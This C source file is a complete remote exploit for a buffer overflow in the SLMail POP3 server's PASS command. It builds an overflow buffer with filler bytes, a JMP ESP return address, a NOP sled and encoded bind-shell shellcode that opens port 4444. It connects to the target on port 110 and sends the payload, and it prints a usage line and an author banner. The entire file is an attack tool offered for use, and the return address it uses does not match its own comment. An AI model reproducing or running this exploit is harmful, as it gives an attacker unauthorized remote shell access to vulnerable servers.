/*
SLMAIL REMOTE PASSWD BOF - Ivan Ivanovic Ivanov Иван-дурак
недействительный 31337 Team
*/

#include <string.h>
#include <stdio.h>
#include <winsock2.h>
#include <windows.h>

// [*] bind 4444 
unsigned char shellcode[] = 
"\xbb\xae\xf4\x4c\x10\xd9\xcd\xd9\x74\x24\xf4\x5a\x29\xc9\xb1"
"\x52\x31\x5a\x12\x83\xea\xfc\x03\xf4\xfa\xae\xe5\xf4\xeb\xad"
"\x06\x04\xec\xd1\x8f\xe1\xdd\xd1\xf4\x62\x4d\xe2\x7f\x26\x62"
"\x89\xd2\xd2\xf1\xff\xfa\xd5\xb2\x4a\xdd\xd8\x43\xe6\x1d\x7b"
"\xc0\xf5\x71\x5b\xf9\x35\x84\x9a\x3e\x2b\x65\xce\x97\x27\xd8"
"\xfe\x9c\x72\xe1\x75\xee\x93\x61\x6a\xa7\x92\x40\x3d\xb3\xcc"
"\x42\xbc\x10\x65\xcb\xa6\x75\x40\x85\x5d\x4d\x3e\x14\xb7\x9f"
"\xbf\xbb\xf6\x2f\x32\xc5\x3f\x97\xad\xb0\x49\xeb\x50\xc3\x8e"
"\x91\x8e\x46\x14\x31\x44\xf0\xf0\xc3\x89\x67\x73\xcf\x66\xe3"
"\xdb\xcc\x79\x20\x50\xe8\xf2\xc7\xb6\x78\x40\xec\x12\x20\x12"
"\x8d\x03\x8c\xf5\xb2\x53\x6f\xa9\x16\x18\x82\xbe\x2a\x43\xcb"
"\x73\x07\x7b\x0b\x1c\x10\x08\x39\x83\x8a\x86\x71\x4c\x15\x51"
"\x75\x67\xe1\xcd\x88\x88\x12\xc4\x4e\xdc\x42\x7e\x66\x5d\x09"
"\x7e\x87\x88\x9e\x2e\x27\x63\x5f\x9e\x87\xd3\x37\xf4\x07\x0b"
"\x27\xf7\xcd\x24\xc2\x02\x86\x40\x18\x0c\x8e\x3d\x1c\x0c\x2f"
"\x05\xa9\xea\x45\x69\xfc\xa5\xf1\x10\xa5\x3d\x63\xdc\x73\x38"
"\xa3\x56\x70\xbd\x6a\x9f\xfd\xad\x1b\x6f\x48\x8f\x8a\x70\x66"
"\xa7\x51\xe2\xed\x37\x1f\x1f\xba\x60\x48\xd1\xb3\xe4\x64\x48"
"\x6a\x1a\x75\x0c\x55\x9e\xa2\xed\x58\x1f\x26\x49\x7f\x0f\xfe"
"\x52\x3b\x7b\xae\x04\x95\xd5\x08\xff\x57\x8f\xc2\xac\x31\x47"
"\x92\x9e\x81\x11\x9b\xca\x77\xfd\x2a\xa3\xc1\x02\x82\x23\xc6"
"\x7b\xfe\xd3\x29\x56\xba\xe4\x63\xfa\xeb\x6c\x2a\x6f\xae\xf0"
"\xcd\x5a\xed\x0c\x4e\x6e\x8e\xea\x4e\x1b\x8b\xb7\xc8\xf0\xe1"
"\xa8\xbc\xf6\x56\xc8\x94";

void exploit(int sock) {
      FILE *test;
      int *ptr;
      char userbuf[] = "USER madivan\r\n";
      char evil[3001];
      char buf[3012];
      char receive[1024];
      char nopsled[] = "\x90\x90\x90\x90\x90\x90\x90\x90\x90"
                       "\x90\x90\x90\x90\x90\x90\x90\x90\x90";
      memset(buf, 0x00, 3012);
      memset(evil, 0x00, 3001);
      memset(evil, 0x43, 2606);
      ptr = &evil;
      ptr = ptr + 652; // 2608 
      memcpy(ptr, &nopsled, 16);
      ptr = ptr + 4;
      memcpy(ptr, &shellcode, 324);
      *(long*)&evil[2606] = 0x5f4a358f; // JMP ESP XP 7CB41020 FFE4 JMP ESP

      // banner
      recv(sock, receive, 200, 0);
      printf("[+] %s", receive);
      // user
      printf("[+] Sending Username...\n");
      send(sock, userbuf, strlen(userbuf), 0);
      recv(sock, receive, 200, 0);
      printf("[+] %s", receive);
      // passwd
      printf("[+] Sending Evil buffer...\n");
      sprintf(buf, "PASS %s\r\n", evil);
      //test = fopen("test.txt", "w");
      //fprintf(test, "%s", buf);
      //fclose(test);
      send(sock, buf, strlen(buf), 0);
      printf("[*] Done! Connect to the host on port 4444...\n\n");
}

int connect_target(char *host, u_short port)
{
    int sock = 0;
    struct hostent *hp;
    WSADATA wsa;
    struct sockaddr_in sa;

    WSAStartup(MAKEWORD(2,0), &wsa);
    memset(&sa, 0, sizeof(sa));

    hp = gethostbyname(host);
    if (hp == NULL) {
        printf("gethostbyname() error!\n"); exit(0);
    }
    printf("[+] Connecting to %s\n", host);
    sa.sin_family = AF_INET;
    sa.sin_port = htons(port);
    sa.sin_addr = **((struct in_addr **) hp->h_addr_list);

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0)      {
        printf("[-] socket blah?\n");
        exit(0);
        }
    if (connect(sock, (struct sockaddr *) &sa, sizeof(sa)) < 0)
        {printf("[-] connect() blah!\n");
        exit(0);
          }
    printf("[+] Connected to %s\n", host);
    return sock;
}


int main(int argc, char **argv)
{
    int sock = 0;
    int data, port;
    printf("\n[$] SLMail Server POP3 PASSWD Buffer Overflow exploit\n");
    printf("[$] by Mad Ivan [ void31337 team ] - http://exploit.void31337.ru\n\n");
    if ( argc < 2 ) { printf("usage: slmail-ex.exe <host> \n\n"); exit(0); }
    port = 110;
    sock = connect_target(argv[1], port);
    exploit(sock);
    closesocket(sock);
    return 0;
}
